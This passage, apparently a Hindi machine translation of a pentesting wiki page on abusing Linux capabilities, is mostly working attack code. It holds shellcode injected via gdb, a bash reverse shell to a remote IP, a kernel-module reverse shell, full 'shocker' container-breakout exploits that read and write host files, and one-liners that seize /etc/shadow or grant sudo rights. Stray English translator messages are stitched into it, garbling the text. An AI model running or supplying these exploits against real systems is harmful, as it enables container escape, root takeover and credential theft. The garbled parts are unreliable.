buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (8 - len(buf) % 8 ) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
chunk = payload[i:i+8][::-1]
chunks = "0x"
for byte in chunk:
chunks += f"{byte:02x}"

print(f"set {{long}}($rip+{i}) = {chunks}")
```
रूट प्रक्रिया को gdb के साथ डीबग करें और पहले उत्पन्न gdb लाइनों को कॉपी-पेस्ट करें:
```bash
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) set {long}($rip+0) = 0x296a909090909090
(gdb) set {long}($rip+8) = 0x5e016a5f026a9958
(gdb) set {long}($rip+16) = 0x0002b9489748050f
(gdb) set {long}($rip+24) = 0x48510b0e0a0a2923
(gdb) set {long}($rip+32) = 0x582a6a5a106ae689
(gdb) set {long}($rip+40) = 0xceff485e036a050f
(gdb) set {long}($rip+48) = 0x6af675050f58216a
(gdb) set {long}($rip+56) = 0x69622fbb4899583b
(gdb) set {long}($rip+64) = 0x8948530068732f6e
(gdb) set {long}($rip+72) = 0x050fe689485752e7
(gdb) c
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```
**उदाहरण पर्यावरण के साथ (Docker breakout) - एक और GDB का दुरुपयोग**

यदि **GDB** स्थापित है (या आप इसे `apk add gdb` या `apt install gdb` के साथ स्थापित कर सकते हैं) तो आप **होस्ट से एक प्रक्रिया को डीबग कर सकते हैं** और इसे `system` फ़ंक्शन को कॉल करने के लिए बना सकते हैं। (इस तकनीक के लिए क्षमता `SYS_ADMIN` की भी आवश्यकता होती है)**।**
```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```
आप उस प्रक्रिया द्वारा आदेश का आउटपुट नहीं देख पाएंगे लेकिन वह आदेश उस प्रक्रिया द्वारा निष्पादित होगा (इसलिए एक rev shell प्राप्त करें)।

{% hint style="warning" %}
यदि आपको "No symbol "system" in current context." त्रुटि मिलती है, तो gdb के माध्यम से एक प्रोग्राम में shellcode लोड करने वाले पिछले उदाहरण की जांच करें।
{% endhint %}

**उदाहरण पर्यावरण के साथ (Docker breakout) - Shellcode Injection**

आप docker container के अंदर सक्षम capabilities की जांच इस प्रकार कर सकते हैं:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```
**होस्ट** में चल रहे **प्रोसेस** की सूची `ps -eaf`

1. **आर्किटेक्चर** प्राप्त करें `uname -m`
2. आर्किटेक्चर के लिए **शेलकोड** खोजें ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. एक **प्रोग्राम** खोजें जिससे प्रोसेस मेमोरी में **शेलकोड** **इंजेक्ट** किया जा सके ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. प्रोग्राम में **शेलकोड** को **संशोधित** करें और इसे **कंपाइल** करें `gcc inject.c -o inject`
5. इसे **इंजेक्ट** करें और अपना **शेल** प्राप्त करें: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

[**CAP_SYS_MODULE**](https://man7.org/linux/man-pages/man7/capabilities.7.html) यह प्रोसेस को मनमाने कर्नेल मॉड्यूल्स को लोड और अनलोड करने की अनुमति देता है (`init_module(2)`, `finit_module(2)` और `delete_module(2)` सिस्टम कॉल्स). इससे आसानी से प्रिविलेज एस्केलेशन और रिंग-0 समझौता हो सकता है. कर्नेल को मनचाहे तरीके से संशोधित किया जा सकता है, जिससे सभी सिस्टम सुरक्षा, लिनक्स सिक्योरिटी मॉड्यूल्स, और कंटेनर सिस्टम्स को बायपास किया जा सकता है.\
**इसका मतलब यह है कि आप होस्ट मशीन के कर्नेल में कर्नेल मॉड्यूल्स को डाल/निकाल सकते हैं.**

**बाइनरी के साथ उदाहरण**

निम्नलिखित उदाहरण में बाइनरी **`python`** में यह क्षमता है.
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```
डिफ़ॉल्ट रूप से, **`modprobe`** कमांड निर्भरता सूची और मैप फाइलों की जांच **`/lib/modules/$(uname -r)`** निर्देशिका में करता है।\
इसका दुरुपयोग करने के लिए, आइए एक नकली **lib/modules** फोल्डर बनाते हैं:
```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```
तब **कर्नेल मॉड्यूल को कंपाइल करें जिसके 2 उदाहरण नीचे दिए गए हैं और इसे इस फोल्डर में कॉपी करें:**
```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```
अंत में, इस कर्नेल मॉड्यूल को लोड करने के लिए आवश्यक पायथन कोड को निष्पादित करें:
```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```
**उदाहरण 2 बाइनरी के साथ**

निम्नलिखित उदाहरण में बाइनरी **`kmod`** में यह क्षमता है।
```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```
इसका मतलब है कि **`insmod`** कमांड का उपयोग करके एक कर्नेल मॉड्यूल डालना संभव है। इस विशेषाधिकार का दुरुपयोग करके **reverse shell** प्राप्त करने के लिए नीचे दिए गए उदाहरण का अनुसरण करें।

**उदाहरण पर्यावरण के साथ (Docker breakout)**

आप docker container के अंदर सक्षम capabilities की जांच कर सकते हैं इसका उपयोग करके:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
पिछले आउटपुट में आप देख सकते हैं कि **SYS\_MODULE** क्षमता सक्षम है।

**कर्नेल मॉड्यूल** बनाएं जो एक रिवर्स शेल को निष्पादित करने वाला है और **Makefile** इसे **संकलित** करने के लिए:

{% code title="reverse-shell.c" %}
```c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
The text provided does not contain any content to translate, it only includes markdown syntax for ending and starting a code block with a title. Please provide the English text that needs to be translated into Hindi, and I will translate it while maintaining the markdown and HTML syntax as requested.
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
Makefile में प्रत्येक make शब्द से पहले का खाली स्थान **टैब होना चाहिए, स्पेस नहीं**!
{% endhint %}

इसे कंपाइल करने के लिए `make` का उपयोग करें।
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
अंत में, एक शेल में `nc` शुरू करें और **मॉड्यूल लोड करें** दूसरे शेल से और आप nc प्रक्रिया में शेल को कैप्चर कर लेंगे:
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**इस तकनीक का कोड "Abusing SYS\_MODULE Capability" प्रयोगशाला से नकल किया गया है** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

इस तकनीक का एक और उदाहरण [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) पर मिल सकता है।

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) एक प्रक्रिया को **फाइल पढ़ने, और डायरेक्टरी पढ़ने और निष्पादित करने की अनुमतियों को बायपास करने की अनुमति देता है**। जबकि इसे फाइलों को खोजने या पढ़ने के लिए इस्तेमाल किया जाना था, यह प्रक्रिया को `open_by_handle_at(2)` को आमंत्रित करने की अनुमति भी देता है। किसी भी प्रक्रिया के पास `CAP_DAC_READ_SEARCH` क्षमता होने पर वह `open_by_handle_at(2)` का उपयोग करके किसी भी फाइल तक पहुंच प्राप्त कर सकती है, यहां तक कि उनके माउंट नेमस्पेस के बाहर की फाइलें भी। `open_by_handle_at(2)` में पास किया गया हैंडल एक अपारदर्शी पहचानकर्ता होना चाहिए जिसे `name_to_handle_at(2)` का उपयोग करके प्राप्त किया गया हो। हालांकि, इस हैंडल में संवेदनशील और छेड़छाड़ करने योग्य जानकारी होती है, जैसे कि इनोड नंबर। इसे पहली बार Docker कंटेनरों में Sebastian Krahmer द्वारा [shocker](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) एक्सप्लॉइट के साथ एक मुद्दा दिखाया गया था।\
**इसका मतलब है कि आप** **फाइल पढ़ने की अनुमति जांच और डायरेक्टरी पढ़ने/निष्पादित करने की अनुमति जांच को बायपास कर सकते हैं।**

**बाइनरी के साथ उदाहरण**

बाइनरी किसी भी फाइल को पढ़ने में सक्षम होगी। इसलिए, अगर तार जैसी फाइल में यह क्षमता होती है तो वह शैडो फाइल को पढ़ सकती है:
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**उदाहरण बाइनरी2 के साथ**

इस मामले में मान लेते हैं कि **`python`** बाइनरी में यह क्षमता है। रूट फाइलों की सूची बनाने के लिए आप यह कर सकते हैं:
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
और फाइल पढ़ने के लिए आप कर सकते हैं:
```python
print(open("/etc/shadow", "r").read())
```
**पर्यावरण में उदाहरण (Docker breakout)**

आप डॉकर कंटेनर के अंदर सक्षम क्षमताओं की जांच कर सकते हैं इसका उपयोग करके:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
पिछले आउटपुट में आप देख सकते हैं कि **DAC\_READ\_SEARCH** क्षमता सक्षम है। परिणामस्वरूप, कंटेनर **प्रक्रियाओं का डिबग कर सकता है**।

आप यहाँ जान सकते हैं कि निम्नलिखित शोषण कैसे काम करता है [https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) लेकिन संक्षेप में **CAP\_DAC\_READ\_SEARCH** न केवल हमें बिना अनुमति जांच के फाइल सिस्टम को पार करने की अनुमति देता है, बल्कि यह स्पष्ट रूप से _**open\_by\_handle\_at(2)**_ के लिए किसी भी जांच को हटा देता है और **हमारी प्रक्रिया को अन्य प्रक्रियाओं द्वारा खोली गई संवेदनशील फाइलों तक पहुँचने की अनुमति दे सकता है**।

मूल शोषण जो इस अनुमतियों का दुरुपयोग करके होस्ट से फाइलों को पढ़ने के लिए करता है, यहाँ पाया जा सकता है: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), निम्नलिखित एक **संशोधित संस्करण है जो आपको पहले तर्क के रूप में पढ़ना चाहते हैं फाइल को संकेत करने और इसे एक फाइल में डंप करने की अनुमति देता है।**
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
इस exploit को होस्ट पर माउंट की गई किसी चीज़ का पॉइंटर ढूंढना आवश्यक है। मूल exploit ने फाइल /.dockerinit का इस्तेमाल किया था और यह संशोधित संस्करण /etc/hostname का उपयोग करता है। यदि exploit काम नहीं कर रहा है तो शायद आपको एक अलग फाइल सेट करने की आवश्यकता है। होस्ट में माउंट की गई फाइल को ढूंढने के लिए बस mount कमांड निष्पादित करें:
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**इस तकनीक का कोड "Abusing DAC\_READ\_SEARCH Capability" प्रयोगशाला से नकल किया गया है** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) **स्पेन** में साइबर सुरक्षा की सबसे प्रासंगिक घटना है और **यूरोप** में सबसे महत्वपूर्ण में से एक है। **तकनीकी ज्ञान को बढ़ावा देने के मिशन के साथ**, यह कांग्रेस हर अनुशासन में प्रौद्योगिकी और साइबर सुरक्षा पेशेवरों के लिए एक उबलता मिलन बिंदु है।

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**इसका मतलब है कि आप किसी भी फाइल पर लिखने की अनुमति जांच को बायपास कर सकते हैं, इसलिए आप किसी भी फाइल को लिख सकते हैं।**

बहुत सारी फाइलें हैं जिन्हें आप **विशेषाधिकार बढ़ाने के लिए ओवरराइट कर सकते हैं,** [**यहां से विचार प्राप्त कर सकते हैं**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**बाइनरी के साथ उदाहरण**

इस उदाहरण में vim के पास यह क्षमता है, इसलिए आप _passwd_, _sudoers_ या _shadow_ जैसी किसी भी फाइल को संशोधित कर सकते हैं:
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**उदाहरण बाइनरी 2 के साथ**

इस उदाहरण में **`python`** बाइनरी के पास यह क्षमता होगी। आप python का उपयोग किसी भी फाइल को ओवरराइड करने के लिए कर सकते हैं:
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**उदाहरण पर्यावरण + CAP\_DAC\_READ\_SEARCH के साथ (Docker ब्रेकआउट)**

आप Docker कंटेनर के अंदर सक्षम क्षमताओं की जांच कर सकते हैं इसका उपयोग करके:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
सबसे पहले पिछले अनुभाग को पढ़ें जो [**DAC\_READ\_SEARCH क्षमता का दुरुपयोग करके मनमानी फाइलों को पढ़ता है**](linux-capabilities.md#cap\_dac\_read\_search) और होस्ट की और **exploit को संकलित करें**।
फिर, **निम्नलिखित संस्करण का shocker exploit संकलित करें** जो आपको होस्ट की फाइल सिस्टम के अंदर **मनमानी फाइलें लिखने की अनुमति देगा**:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
डॉकर कंटेनर से बचने के लिए आप होस्ट से `/etc/shadow` और `/etc/passwd` फाइल्स **डाउनलोड** कर सकते हैं, उनमें एक **नया उपयोगकर्ता** **जोड़** सकते हैं, और **`shocker_write`** का उपयोग करके उन्हें ओवरराइट कर सकते हैं। फिर, **ssh** के माध्यम से **प्रवेश** करें।

**इस तकनीक का कोड "Abusing DAC\_OVERRIDE Capability" प्रयोगशाला से नकल किया गया है** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP\_CHOWN

**इसका मतलब है कि किसी भी फाइल के मालिकाना हक को बदलना संभव है।**

**बाइनरी के साथ उदाहरण**

मान लीजिए **`python`** बाइनरी में यह क्षमता है, आप **shadow** फाइल के **मालिक** को **बदल** सकते हैं, **रूट पासवर्ड बदल** सकते हैं, और अधिकार बढ़ा सकते हैं:
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
या इस क्षमता के साथ **`ruby`** बाइनरी के द्वारा:
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**इसका मतलब है कि किसी भी फाइल की अनुमति बदलना संभव है।**

**बाइनरी के साथ उदाहरण**

यदि पायथन के पास यह क्षमता है तो आप शैडो फाइल की अनुमतियों को संशोधित कर सकते हैं, **रूट पासवर्ड बदलें**, और विशेषाधिकार बढ़ा सकते हैं:
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**इसका मतलब है कि बनाई गई प्रक्रिया की प्रभावी उपयोगकर्ता आईडी सेट करना संभव है।**

**बाइनरी के साथ उदाहरण**

यदि python में यह **क्षमता** है, तो आप इसे बहुत आसानी से दुरुपयोग करके रूट के लिए विशेषाधिकार बढ़ा सकते हैं:
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**एक और तरीका:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**इसका मतलब है कि बनाई गई प्रक्रिया की प्रभावी समूह आईडी सेट करना संभव है।**

बहुत सारी फाइलें हैं जिन्हें आप **अधिकार बढ़ाने के लिए ओवरराइट कर सकते हैं,** [**यहाँ से विचार प्राप्त कर सकते हैं**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**बाइनरी के साथ उदाहरण**

इस मामले में आपको उन दिलचस्प फाइलों की तलाश करनी चाहिए जिन्हें कोई समूह पढ़ सकता है क्योंकि आप किसी भी समूह का रूप धारण कर सकते हैं:
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
एक बार जब आपको एक फाइल मिल जाती है जिसका दुरुपयोग आप विशेषाधिकार बढ़ाने के लिए कर सकते हैं (पढ़ने या लिखने के द्वारा), आप **दिलचस्प समूह की नकल करते हुए एक शेल प्राप्त कर सकते हैं** इस प्रकार से:
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
इस मामले में समूह shadow का अनुकरण किया गया था ताकि आप फ़ाइल `/etc/shadow` को पढ़ सकें:
```bash
cat /etc/shadow
```
यदि **docker** स्थापित है, तो आप **docker group** की नकल कर सकते हैं और इसका दुरुपयोग करके [**docker socket** के साथ संवाद कर सकते हैं और विशेषाधिकार बढ़ा सकते हैं](./#writable-docker-socket).

## CAP\_SETFCAP

**इसका मतलब है कि फाइलों और प्रक्रियाओं पर क्षमताएं सेट करना संभव है**

**बाइनरी के साथ उदाहरण**

यदि python के पास यह **क्षमता** है, तो आप इसका बहुत आसानी से दुरुपयोग करके रूट के लिए विशेषाधिकार बढ़ा सकते हैं:

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
Since the provided text does not contain any English content to translate, there is nothing to translate into Hindi. If you provide the relevant English text, I can then translate it into Hindi for you.
```bash
